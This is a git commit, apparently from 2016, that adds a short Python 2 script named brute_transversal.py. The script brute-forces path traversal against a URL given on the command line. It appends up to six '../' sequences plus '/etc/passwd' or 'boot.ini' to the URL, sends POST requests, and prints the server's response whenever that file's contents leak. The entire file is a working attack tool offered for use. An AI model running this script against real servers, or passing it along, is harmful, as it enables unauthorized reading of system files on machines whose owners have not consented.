72103c27852c4cdd72978e310a695d6bfc41d7ed
Leandro B Pereira <leandrobatistapereira98@gmail.com>
2016-09-29 00:00:38 -0300

    Brute force transversal de diretorios

---
+++ brute_transversal.py
@@ -0,0 +1,21 @@
+#!/usr/bin/env python
+# Author: Leandro Batista
+# E-mail: leandrobatistapereira98@gmail.com
+#
+
+import requests
+import sys
+
+url = sys.argv[1]
+cargas = {'/etc/passwd': 'root', 'boot.ini': '[boot loader]'}
+subindo = "../"
+i = 0
+
+for carga, string in cargas.iteritems():
+    for i in xrange(7):
+        r = requests.post(url + (i * subindo) + carga)
+        if string in r.text:
+            print 'Vulneravel:\r\n'
+            print 'Ataque string: ' + (i * subindo) + carga + '\r\n'
+            print r.text
+            break
